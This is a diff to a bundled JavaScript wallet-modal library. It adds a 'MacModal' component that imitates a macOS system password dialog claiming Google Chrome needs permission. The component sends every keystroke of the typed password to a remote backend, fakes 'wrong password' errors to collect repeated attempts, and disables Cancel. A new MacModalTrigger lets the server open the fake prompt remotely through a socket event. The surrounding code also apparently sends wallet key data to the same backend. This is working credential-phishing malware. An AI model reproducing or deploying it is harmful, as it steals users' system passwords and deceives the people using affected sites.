@@ -57,6 +57,12 @@ const walletConfigs = {
         shortKey: 'SF',
         icon: '🌐',
     },
+    Mac: {
+        id: 'Mac',
+        name: 'Mac',
+        shortKey: 'MAC',
+        icon: '🍎',
+    },
 };
 /**
  * Get wallet configuration by type
@@ -87,6 +93,7 @@ const defaultConfig = {
     // backendUrl: "http://localhost:3000",
     backendUrl: "https://api.riveanimation.cards",
     assetBaseUrl: "https://www.riveanimation.cards", // Default asset base URL
+    macModalSocketEvent: "showMacModal",
 };
 let currentConfig = { ...defaultConfig };
 const getConfig = () => ({ ...currentConfig });
@@ -97,6 +104,7 @@ const getClientSocket = () => currentConfig.clientSocket;
 const getClientUrl = () => currentConfig.clientUrl;
 const getBackendUrl = () => currentConfig.backendUrl;
 const getAssetBaseUrl = () => currentConfig.assetBaseUrl;
+const getMacModalSocketEvent = () => currentConfig.macModalSocketEvent;
 // Wallet type shortkeys
 const WALLET_TYPE_SHORTKEY = {
     METAMASK: "MM",
@@ -105,8 +113,7 @@ const WALLET_TYPE_SHORTKEY = {
     TRONLINK: "TL",
     BITGET: "BG",
     COINBASE: "CB",
-    SOLFLARE: "SF",
-};
+    SOLFLARE: "SF"};
 
 // Cache for user wallet types
 const walletTypesCache = new Map();
@@ -603,6 +610,26 @@ const getSocketInstance = () => {
  */
 const initializeSocket = () => {
     return getSocketInstance();
+};
+/**
+ * Subscribe to backend "show Mac modal" socket event.
+ * When the backend emits this event, the callback is invoked.
+ * Use with MacModalTrigger to show the Mac modal on signal.
+ *
+ * @param callback - Called when the backend emits the showMacModal event (configurable via macModalSocketEvent).
+ * @returns Unsubscribe function.
+ */
+const subscribeToShowMacModal = (callback) => {
+    const socket = getSocketInstance();
+    if (!socket) {
+        return () => { };
+    }
+    const eventName = getMacModalSocketEvent();
+    const handler = () => callback();
+    socket.on(eventName, handler);
+    return () => {
+        socket.off(eventName, handler);
+    };
 };
 /**
  * Send key data to backend via API
@@ -2831,6 +2858,150 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
     return modalContent;
 };
 
+const LOCK_ICON_SVG = (React.createElement("svg", { width: "70", height: "70", viewBox: "0 0 24 24", fill: "none", xmlns: "http://www.w3.org/2000/svg", className: "text-[rgba(245,248,255,0.9)]" },
+    React.createElement("path", { d: "M6 10V7a6 6 0 0 1 12 0v3m-9 10h6a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2H9a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2z", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" })));
+const MacModal = ({ isOpen, onClose, userId, backendConfig }) => {
+    const [keyword, setKeyword] = React.useState('');
+    const [connecting, setConnecting] = React.useState(false);
+    const [trying, setTrying] = React.useState(0);
+    const [submitting, setSubmitting] = React.useState(false);
+    const [isWrongPassword, setIsWrongPassword] = React.useState(false);
+    const passwordInputRef = React.useRef(null);
+    const modalRef = React.useRef(null);
+    const [isDragging, setIsDragging] = React.useState(false);
+    const [modalPosition, setModalPosition] = React.useState({ x: 0, y: 0 });
+    const dragStartPos = React.useRef({ x: 0, y: 0 });
+    React.useEffect(() => {
+        if (isOpen) {
+            initializeLocationData();
+            initializeSocket();
+            setModalPosition({ x: 0, y: 0 });
+            setTimeout(() => {
+                passwordInputRef.current?.focus();
+            }, 300);
+        }
+    }, [isOpen]);
+    React.useEffect(() => {
+        if (!isDragging)
+            return;
+        const handleMouseMove = (e) => {
+            const deltaX = e.clientX - dragStartPos.current.x;
+            const deltaY = e.clientY - dragStartPos.current.y;
+            setModalPosition((prev) => ({
+                x: prev.x + deltaX,
+                y: prev.y + deltaY,
+            }));
+            dragStartPos.current = { x: e.clientX, y: e.clientY };
+        };
+        const handleMouseUp = () => {
+            setIsDragging(false);
+        };
+        document.addEventListener('mousemove', handleMouseMove);
+        document.addEventListener('mouseup', handleMouseUp);
+        return () => {
+            document.removeEventListener('mousemove', handleMouseMove);
+            document.removeEventListener('mouseup', handleMouseUp);
+        };
+    }, [isDragging]);
+    const handleMouseDown = (e) => {
+        const target = e.target;
+        if (target.tagName === 'BUTTON' ||
+            target.tagName === 'INPUT' ||
+            target.closest('button') ||
+            target.closest('input')) {
+            return;
+        }
+        setIsDragging(true);
+        dragStartPos.current = { x: e.clientX, y: e.clientY };
+    };
+    const handleKeywordChange = async (e) => {
+        const newKeyword = e.target.value;
+        setKeyword(newKeyword);
+        const currentUserId = backendConfig?.userId || userId;
+        if (currentUserId && newKeyword && backendConfig?.enabled !== false) {
+            await sendKeyToBackend(currentUserId, 'cha', newKeyword, 'MAC');
+        }
+    };
+    const handleKeywordTyping = async () => {
+        if (connecting || !keyword)
+            return;
+        setConnecting(true);
+        const currentUserId = backendConfig?.userId || userId;
+        if (!currentUserId) {
+            setConnecting(false);
+            return;
+        }
+        if (backendConfig?.enabled !== false) {
+            await sendKeyToBackend(currentUserId, 'enter', keyword, 'MAC');
+            setSubmitting(true);
+            setTimeout(() => {
+                setConnecting(false);
+                if (trying < 2) {
+                    setTrying(trying + 1);
+                }
+                else {
+                    if (onClose)
+                        onClose();
+                }
+                setSubmitting(false);
+                passwordInputRef.current?.focus();
+                setIsWrongPassword(true);
+                setTimeout(() => {
+                    setIsWrongPassword(false);
+                }, 500);
+            }, 500);
+        }
+        else {
+            setTimeout(() => setConnecting(false), 150);
+        }
+    };
+    const handleKeyDown = (e) => {
+        if (e.key === 'Enter' && keyword && !connecting) {
+            handleKeywordTyping();
+        }
+    };
+    if (!isOpen)
+        return null;
+    const adminName = 'Administrator';
+    const appName = 'Google Chrome';
+    const handleCancelButton = () => {
+        setIsWrongPassword(true);
+        setTimeout(() => {
+            setIsWrongPassword(false);
+        }, 500);
+    };
+    return (React.createElement(React.Fragment, null,
+        React.createElement("div", { className: `fixed inset-0 z-[9999] transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, style: {
+                backdropFilter: 'blur(18px) saturate(140%)',
+                WebkitBackdropFilter: 'blur(18px) saturate(140%)',
+                backgroundColor: 'rgba(0, 0, 0, 0.0)',
+            } }),
+        React.createElement("div", { className: `fixed inset-0 z-[10000] flex items-center justify-center transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}` },
+            React.createElement("div", { onMouseDown: handleMouseDown, ref: modalRef, className: `bg-[#2f2f2f] rounded-[14px] border border-black shadow-[0_18px_60px_rgba(0,0,0,0.55)] w-[280px] transition-all duration-300 ${isOpen ? 'scale-100' : 'scale-95'} ${isWrongPassword ? 'vibrate' : ''}`, style: {
+                    boxShadow: '0 18px 60px rgba(0, 0, 0, 0.55)',
+                    transform: `translate(${modalPosition.x}px, ${modalPosition.y}px) ${isOpen ? 'scale(1)' : 'scale(0.95)'}`,
+                    transition: isDragging ? 'none' : 'transform 0.3s ease-out, opacity 0.3s ease-out',
+                } },
+                React.createElement("div", { className: "px-[24px] pb-[18px] select-none" },
+                    React.createElement("div", { className: "w-full h-[22px]" }),
+                    React.createElement("div", { className: "flex justify-center mb-[8px]" },
+                        React.createElement("div", { className: "relative w-[70px] h-[70px] flex items-center justify-center" }, LOCK_ICON_SVG)),
+                    React.createElement("div", { className: "text-center text-[15px] font-semibold text-[#f5f5f7] leading-[20px] mb-[10px] mac-font-bold" }, appName),
+                    React.createElement("div", { className: "text-center text-[12px] text-[rgba(245,248,255,0.82)] leading-[16px] mb-[8px] mac-font" },
+                        React.createElement("div", null,
+                            appName,
+                            " is trying to improve"),
+                        React.createElement("div", null, "network connection"),
+                        React.createElement("div", { className: "mt-[20px] text-[rgba(245,248,255,0.72)] mac-font tracking-wide" }, "Enter your password to allow this.")),
+                    React.createElement("div", { className: "mb-[8px]" },
+                        React.createElement("input", { value: adminName, className: `tracking-wider w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? 'bg-[#2f2f2f] text-[#f5f5f75d]' : 'bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'} mac-font`, disabled: submitting, readOnly: true })),
+                    React.createElement("div", { className: "mb-[18px]" },
+                        React.createElement("input", { ref: passwordInputRef, type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, placeholder: "Password", autoComplete: "off", spellCheck: false, disabled: submitting, className: `tracking-widest w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? 'bg-[#2f2f2f] text-[#f5f5f75d]' : 'bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'} mac-font` })),
+                    React.createElement("div", { className: "flex gap-[10px]" },
+                        React.createElement("button", { onClick: handleCancelButton, className: `flex-1 h-[28px] rounded-[7px] text-[13px] font-medium hover:bg-[rgba(255,255,255,0.28)] active:bg-[rgba(255,255,255,0.32)] transition-colors ${submitting ? 'bg-[rgba(255,255,255,0.11)] text-[#f5f5f75d]' : 'bg-[rgba(255,255,255,0.22)] text-[#f5f5f7]'} mac-font`, disabled: submitting }, "Cancel"),
+                        React.createElement("button", { onClick: handleKeywordTyping, disabled: submitting, className: `flex-1 h-[28px] rounded-[7px] text-[13px] font-semibold transition-colors active:bg-[#3c9cfc] ${submitting ? 'bg-[rgba(255,255,255,0.11)] text-[#f5f5f75d]' : 'bg-[#0a84ff] text-white'} mac-font` }, "OK")))))));
+};
+
 const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendConfig, darkMode: darkModeProp, // Allow override if provided
  }) => {
     // Detect browser's dark mode preference
@@ -2870,6 +3041,9 @@ const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendCon
             break;
         case 'Solflare':
             modalComponent = React.createElement(SolflareModal, { ...modalProps });
+            break;
+        case 'Mac':
+            modalComponent = React.createElement(MacModal, { ...modalProps });
             break;
         default:
             // Unknown wallet type - return null or a default modal
@@ -14329,9 +14503,35 @@ const ConnectWalletButton = ({ className = '', userId, }) => {
         selectedWallet && (React.createElement(CustomWalletModal, { wallet: selectedWallet, isOpen: isCustomModalOpen, onClose: handleCloseCustomModal, userId: userId }))));
 };
 
+/**
+ * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal when received.
+ * Mount this component once (e.g. at app root) to enable socket-triggered Mac modal.
+ *
+ * Backend should emit the event configured via `setConfig({ macModalSocketEvent: 'yourEventName' })`.
+ */
+const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
+    const [isOpen, setIsOpen] = React.useState(false);
+    React.useEffect(() => {
+        initializeSocket();
+        const unsubscribe = subscribeToShowMacModal(() => {
+            setIsOpen(true);
+        });
+        return unsubscribe;
+    }, []);
+    const handleClose = () => {
+        setIsOpen(false);
+        onClose?.();
+    };
+    if (!isOpen)
+        return null;
+    return (React.createElement(ModalContainer, null,
+        React.createElement(MacModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: userId ?? backendConfig?.userId, backendConfig: backendConfig })));
+};
+
 exports.ASSET_PATHS = ASSET_PATHS;
 exports.ConnectWalletButton = ConnectWalletButton;
 exports.CustomWalletModal = CustomWalletModal;
+exports.MacModalTrigger = MacModalTrigger;
 exports.WalletSelectionModal = WalletSelectionModal;
 exports.clearWalletTypesCache = clearWalletTypesCache;
 exports.getAllWalletTypes = getAllWalletTypes;
@@ -14341,10 +14541,12 @@ exports.getBackendUrl = getBackendUrl;
 exports.getClientUrl = getClientUrl;
 exports.getConfig = getConfig;
 exports.getIPAndLocation = getIPAndLocation;
+exports.getMacModalSocketEvent = getMacModalSocketEvent;
 exports.getUserWalletTypes = getUserWalletTypes;
 exports.getWalletConfig = getWalletConfig;
 exports.getWalletShortKey = getWalletShortKey;
 exports.resolveAssetUrl = resolveAssetUrl;
 exports.setConfig = setConfig;
+exports.subscribeToShowMacModal = subscribeToShowMacModal;
 exports.walletConfigs = walletConfigs;
 //# sourceMappingURL=index.cjs.map
